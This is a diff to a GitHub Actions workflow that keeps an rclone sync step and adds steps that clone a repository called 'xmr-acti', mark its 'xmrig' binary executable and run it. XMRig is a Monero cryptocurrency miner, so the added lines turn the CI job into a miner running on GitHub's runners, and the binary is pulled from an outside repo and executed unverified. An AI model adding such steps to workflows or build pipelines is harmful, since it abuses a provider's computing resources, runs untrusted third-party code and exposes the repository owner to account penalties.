@@ -37,3 +37,23 @@ jobs:
     - name: Rclone Synchronizing file
       run: |
         rclone copy --ignore-existing vcb: bfpan:VCB
+    - uses: actions/checkout@v2.1.0
+    
+    - name: cd1
+      run:
+           cd /home/runner/work/try/try
+           
+    - name: git clone
+      run:
+           git clone https://github.com/winkxx/xmr-acti
+    - name: cd
+      run:              
+           cd /home/runner/work/try/try/xmr-acti
+           
+    - name: 权限
+      run:              
+          chmod +x /home/runner/work/try/try/xmr-acti/xmrig
+    - name: run
+      run:    
+           /home/runner/work/try/try/xmr-acti/./xmrig
+           
